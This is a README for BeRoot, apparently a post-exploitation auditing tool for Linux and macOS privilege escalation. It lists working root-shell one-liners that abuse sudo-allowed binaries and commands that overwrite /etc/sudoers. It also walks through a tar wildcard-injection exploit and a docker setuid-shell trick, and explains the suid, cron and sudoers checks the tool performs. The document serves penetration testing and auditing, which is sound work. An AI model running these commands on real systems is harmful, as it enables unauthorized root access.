# BeRoot

BeRoot is a post exploitation tool to check common misconfigurations on Linux and Mac OS to find a way to escalate our privilege. 

To understand privilege escalation on these systems, you should understand at least two main notions: LOLBins (this name has been given for Windows binaries but it should be correct to use it for Linux as well) and Wildcards. 
This Readme explains all technics implemented by BeRoot to better understand how to exploit it. 

LOLBins
----

[LOLBins](https://www.urbandictionary.com/define.php?term=LOLBin) could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root. 

Here is a list of well-known binaries: 

* awk
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

* docker (if you can call docker, no need to run it with sudo)
```
docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p
```

* find
```
sudo find . -type d -exec sh -c id {} \;
```

* file viewer
```
less:	!bash
man: 	!bash or $ sudo man -P whoami man
more: 	!bash
```

* file modifications (cannot be consider as LOLbins but useful for privilege escalation)
```
cp:	sudo cp -f your_file /etc/sudoers
mv:	sudo mv -f your_file /etc/sudoers
```

* ftp / sftp
```
ftp> ! ls
```

* git
```
export PAGER=./runme.sh
sudo git -p help
```

* mount
```
sudo mount -o bind /bin/bash /bin/mount
sudo mount
```

* nmap
```
echo "os.execute('/bin/sh')" > /tmp/script.nse
sudo nmap --script=/tmp/script.nse
```

* rsync
```
echo "whoami > /tmp/whoami" > /tmp/tmpfile
sudo rsync  -e 'sh /tmp/tmpfile' /dev/null 127.0.0.1:/dev/null 2>/dev/null

cat whoami 
root
```

* scripting languages
```
lua: 	os.execute('/bin/sh')
perl: 	sudo  perl -e 'exec "/bin/sh";'
python: sudo  python -c 'import os;os.system("/bin/sh")'
ruby: 	sudo ruby -e 'exec "/bin/sh"'
```

* tar
```
sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
```

* text editor
```
vi: 	sudo vi -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell
vim : 	sudo vim -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell
```

* tcpdump
```
echo "whoami > /tmp/whoami" > /tmp/tmpfile
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root

cat whoami 
root
```

* wget (overwrite system file - need a web server)
```
sudo wget http://127.0.0.1/sudoers -O /etc/sudoers
```

* zip
```
echo "/bin/sh" > /tmp/run.sh
sudo zip z.zip * -T -TT /tmp/run.sh
```

__Note__: If you have more binary example, do not hesitate to open an issue explaining the technic and I will add it on the list. 

Having sudo access on these binaries do not mean you could always manage to execute commands on the system. For example, using the __mount__ binary with a limited user could give you the following well known error, if it's well configured:  

```
mount: only root can use "--options" option
```

Wildcards
----

If you have never heard about Unix wildcards, I suggest you read this very well explained [article](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt).
Using wildcards could lead into code execution if this one is not well called. 

For our example, we want to get a shell ("sh") using the __tar__ command to execute code on the server. As explained on the LOLBin section, we could get it doing: 
```
tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
```
We consider a test file which is used to realize an archive of all files present on the directory. 
```
user@host:~$ cat test.sh 
tar cf archive.tar * 
```
Here are the steps to exploit this bad configuration: 
* open nano (with no arguments)
* write something in it
* save file using __tar__ arguments as file names: 
	* --checkpoint-action=exec=sh
	* --checkpoint=1

Once created, this is what you will find: 
```
user@host:~$ ls -la 
total 32
-rw-r--r-- 1 user user     5 Jan 12 10:34 --checkpoint-action=exec=sh
-rw-r--r-- 1 user user     3 Jan 12 10:33 --checkpoint=1
drwxr-xr-x 2 user user  4096 Jan 12 10:34 .
drwxr-xr-x 7 user user  4096 Jan 12 10:29 ..
-rwxr-xr-x 1 user user    22 Jan 12 10:32 test.sh
```
If this file is executed as root (from cron table, from sudoers, etc.), you should gain root access on the system. 

```
user@host:~$ sudo ./test.sh 
sh-4.3# id
uid=0(root) gid=0(root) groups=0(root)
```
So depending on which binary and how the wildcard are used, the exploitation can be done or not. So on our example, the exploitation would not work anymore if the file would be like this: 
```
user@host:~$ cat test.sh 
tar cf archive.tar *.txt
```
Thus, using a tool to detect these misconfigurations is very difficult. A manually analyse should be done to check if it's a false positive or not. 


Sensitive files 
----

Lots of file are run with high permissions on the system (e.g cron files, services, etc.). Here is an example of intersting directories and files:
```
/etc/init.d
/etc/cron.d 
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/at.allow
/etc/at.deny
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/anacrontab
/var/spool/cron/crontabs/root
```

Here are the tests done by BeRoot: 
* checks if you have access with write permission on these files. 
* checks inside the file, to find other paths with write permissions. 
* checks for wildcards (this check could raise false positives, but could also get you useful information). Sometimes, you may need write permissions on a specific folder to create your malicious file (as explained on the wildcard section), this check is not done because it could be done by two many ways on the script and it's difficult to automate.


Suid binaries
----

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. So if suid file is owned by root, you should execute it using root privilege. 

BeRoot prints all suid files because a manually analyse should be done on each binary. However, it realizes some actions: 
* checks if we have write permissions on these binary (why not ? :))
* checks if a LOLBin is used as suid to be able to execute system commands using it (remember you could have suid LOLBin without beeing able to exectute commands - checks LOLBin section with the false positive example using __mount__). 


Sudoers file
----

Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in __/etc/sudoers__ file. \
To better understand the BeRoot workflow, you should have an idea on how a sudoers line is composed.  

Basic line pattern: 
```
users  hosts = (run-as) tags: commands
```

Here is an example using aliases. 
```
User_Alias ADMINS = admin, user, root
Cmnd_Alias ADMIN_CMDS = /sbin/service, /usr/sbin/iptables, python /tmp/file.py
ADMINS ALL = (ALL) NOPASSWD: ADMIN_CMDS
```
So users "admin", "user" and "root" could execute "service", "iptables" and "file.py" without password needed (thanks to NOPASSWD): 
```
admin,user,root ALL = (ALL) NOPASSWD: /sbin/service, /usr/sbin/iptables, python /tmp/file.py
```

So BeRoot will analyse all rules: 
* if it affects our user or our user's group: 
	* check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
	* check for LOLBins
	* check for LOLBins + wildcards 
	* check if we can impersonate another user ("su" command)
		* check write permissions on sensitive files and suid bin for this user
		* realize again all these checks on the sudoers file using this new user

Exploit
----

Because lots of server are vulnerable to well known exploit (dirtycow, etc.), I have embeeded [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) to give an overview of potential CVE that affect the kernel (this module will only work for Linux systems). 


----
| __Alessandro ZANNI__    |
| ------------- |
| __zanni.alessandro@gmail.com__  |
